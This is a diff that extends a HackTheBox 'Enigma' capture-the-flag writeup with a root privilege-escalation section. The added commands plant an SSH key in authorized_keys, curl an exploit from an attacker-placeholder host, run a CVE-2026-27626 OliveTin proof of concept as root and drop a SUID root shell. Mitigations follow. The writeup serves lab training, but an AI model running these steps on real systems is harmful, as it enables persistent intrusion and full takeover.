@@ -9,7 +9,7 @@
 | **Difficulty** | Easy |
 | **Category** | Linux / Web (OpenSTAManager) |
 | **Date completed** | 2026-11-24 |
-| **Author** | _your handle_ |
+| **Author** | d3m0s-null |
 
 > **Disclaimer:** This writeup is for educational purposes only, written after completing the HackTheBox "Enigma" machine in an authorized lab environment. Flags are redacted.
 
@@ -25,7 +25,7 @@ Enigma is a Linux box built around an NFS misconfiguration that leaks a new-empl
 - Webmail client (Roundcube-style) for Kevin/Sarah mailbox access
 - OpenSTAManager RCE PoC for CVE-2026-38751
 - `mysql` client
-- `hashcat` (mode 3200, bcrypt) with `rockyou.txt`
+- `hashcat`
 
 ## 1. Reconnaissance
 
@@ -273,3 +273,156 @@ haris@enigma://home/haris$ cat user.txt
 **user.txt:** `[REDACTED]`
 
 (Note: the OpenSTAManager password for `admin` reused as the site-wide pattern did not apply here — `haris`'s password was independently crackable from rockyou.txt, suggesting weak/reused personal password hygiene rather than a shared company password.)
+
+
+## 6. Privilege Escalation — haris → root
+
+### 6.1 Persistent access via SSH key
+
+With `haris`'s password in hand, generated a local SSH keypair and dropped the public key onto the box to get a stable, authenticated shell instead of relying on the webshell/`su`:
+
+```bash
+ssh-keygen -t ed25519 -f ./haris_key -N ""
+```
+
+From the `www-data` → `su haris` shell:
+
+```bash
+mkdir -p /home/haris/.ssh
+chmod 700 /home/haris/.ssh
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKltxJ/HeeqJuclL9vw1MwD3MNUlY/lfVCDHArZAk2/O attacker@kali" >> /home/haris/.ssh/authorized_keys
+chmod 600 /home/haris/.ssh/authorized_keys
+```
+
+From Kali:
+
+```bash
+ssh -i haris_key haris@<TARGET_IP>
+```
+
+```
+Last login: Tue Nov 24 12:03:26 2026 from <ATTACKER_IP>
+haris@enigma:~$
+```
+### 6.2 Finding a hidden local service
+
+Enumerated listening sockets and found a port not shown in the original `nmap` scan (bound to loopback only):
+
+```bash
+netstat -ano | grep 1337
+```
+
+```
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      off (0.00/0/0)
+```
+
+```bash
+curl http://127.0.0.1:1337
+```
+
+The response revealed an **OliveTin** instance (a web UI for running predefined shell commands), only reachable from localhost — explaining why it never showed up in the external port scan.
+
+### 6.3 CVE-2026-27626 — OliveTin RCE
+
+OliveTin is vulnerable to **CVE-2026-27626**, with a public PoC: [`0xh7ml/CVE-2026-27626-PoC`](https://github.com/0xh7ml/CVE-2026-27626-PoC).
+
+Downloaded the PoC on Kali and served it over HTTP:
+
+```bash
+python3 -m http.server 8000
+```
+
+Pulled it onto the target through the SSH session (no direct internet egress from the box's web app, but outbound `curl` to the attacker host worked):
+
+```bash
+curl http://<ATTACKER_IP>:8000/CVE-2026.27626.py -o /tmp/exploit.py
+```
+
+Confirmed command execution via the OliveTin service — the predefined action triggered a `mysqldump` job, but the PoC's injected command (`id` / `whoami`) still executed as **root**, alongside the expected tool error/usage output from the hijacked action:
+
+```bash
+python3 /tmp/exploit.py -u http://127.0.0.1/ -p 1337 -x id
+```
+
+```
+[+] Execution ID: c7664068-c68f-46b2-98c5-f00e63bc8fbf
+======================================================================
+Command Output
+======================================================================
+exit status 2
+
+Usage: mysqldump [OPTIONS] database [tables]
+...
+uid=0(root) gid=0(root) groups=0(root)
+sh: 1: cannot create /opt/backups/backup.sql: Directory nonexistent
+======================================================================
+```
+
+
+```bash
+python3 /tmp/exploit.py -u http://127.0.0.1/ -p 1337 -x whoami
+```
+
+```
+root
+```
+
+Confirmed: code execution via OliveTin runs as **root**.
+
+### 6.4 Dropping a SUID root shell
+
+```bash
+python3 /tmp/exploit.py -u http://127.0.0.1/ -p 1337 -x "cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash"
+```
+
+```bash
+/tmp/rootbash -p
+```
+
+```
+rootbash-5.2# id
+uid=1000(haris) gid=1000(haris) euid=0(root) egid=0(root) groups=0(root),100(users),1000(haris)
+rootbash-5.2# cd /root
+rootbash-5.2# cat root.txt
+[REDACTED]
+```
+
+Full root access achieved.
+
+
+## 7. Flags
+
+| Flag | Value |
+|---|---|
+| user.txt | `[REDACTED]` |
+| root.txt | `[REDACTED]` |
+
+> ⚠️ Flags are redacted per HackTheBox's community guidelines on sharing flags.
+
+## Lessons Learned
+
+- World-exported NFS shares (`*`) can leak sensitive internal documents (onboarding PDFs with live credentials) with zero authentication.
+- Password reuse across separate mailboxes (Kevin → Sarah) turned one leaked credential into two compromised accounts.
+- Internal admin portal credentials sent over email, combined with an outdated, vulnerable application version (OpenSTAManager 2.9.8, CVE-2026-38751), gave a direct path to remote code execution.
+- Database credentials hardcoded in plaintext config files (`config.inc.php`) are a common pivot point once a web shell is obtained.
+- Application-level password hashes are still crackable with standard wordlists when users choose weak/common passwords (`bestfriends`).
+- Services bound to `127.0.0.1` are invisible to a remote port scan but still reachable (and exploitable) once you have a local shell — always re-run service discovery (`netstat`/`ss`) after landing a foothold.
+- An internal admin tool (OliveTin) meant to safely expose "predefined shell commands" became a direct root-level command execution primitive once CVE-2026-27626 was applied, because the service itself ran as root.
+
+## Mitigations
+
+- Restrict NFS exports to specific trusted hosts/IPs, not `*`, and never place credential-bearing documents on shares without authentication.
+- Enforce unique passwords per account/service; deploy a password manager and ban reuse via policy/tooling.
+- Avoid emailing plaintext credentials; use a secrets vault or forced first-login reset with expiry.
+- Patch/upgrade OpenSTAManager past the version affected by CVE-2026-38751, and restrict the admin panel to internal/VPN access only.
+- Store database credentials outside of web-root config files where possible (environment variables, secrets manager) and restrict file permissions.
+- Enforce strong password policy / MFA for local Linux accounts to resist offline hash cracking.
+- Patch OliveTin past the version affected by CVE-2026-27626, and never run it (or any admin-automation tool) as root — run it as a dedicated low-privilege service account with tightly scoped sudo rules for only the specific commands it needs.
+- Don't rely on "it's only bound to localhost" as a security boundary once an attacker can reach a local shell on the host.
+
+## References
+
+- CVE-2026-38751 — OpenSTAManager authenticated RCE
+- OpenSTAManager RCE Exploit PoC (GitHub)
+- CVE-2026-27626 — OliveTin RCE
+- [0xh7ml/CVE-2026-27626-PoC (GitHub)](https://github.com/0xh7ml/CVE-2026-27626-PoC)
